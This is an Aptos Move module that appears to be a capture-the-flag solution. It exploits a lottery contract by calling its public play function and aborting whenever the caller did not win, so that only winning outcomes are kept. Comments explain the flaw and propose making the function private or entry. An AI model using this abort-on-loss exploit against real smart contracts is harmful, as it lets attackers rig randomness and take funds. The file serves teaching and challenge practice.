module ctf::attack{

    #[test_only]
    use std::signer::address_of;
    #[test_only]
    use aptos_framework::randomness;
    #[test_only]
    use ctf::lottery::{play, has_won};

    const LOSE :u64 =1;

    #[lint::allow_unsafe_randomness]
    #[test(aptos_framework=@aptos_framework,caller=@ctf)]
    public fun attack(aptos_framework:&signer,caller:&signer){
        randomness::initialize(aptos_framework);
        play(caller);
        let win = has_won(address_of(caller));
        if(!win){
            abort LOSE
        }

        ///method
        /// Because the developer did not set the play function to private or entry fun,
        /// the hacker was able to utilize another contract.For example,
        /// when the attacker calls the play function,
        /// he can verify if he won and if not, abort to reset everything.

        /// #[lint::allow_unsafe_randomness]
        //     (public entry fun)/fun play(user: &signer) {
        //         let random_value = randomness::u64_range(0, 100);
        //         if (random_value == 42) {
        //             mint_win_to_user(user, 1000);
        //         }
        //     }
        /// make this fun only allow call by aptos sdk or private
    }
}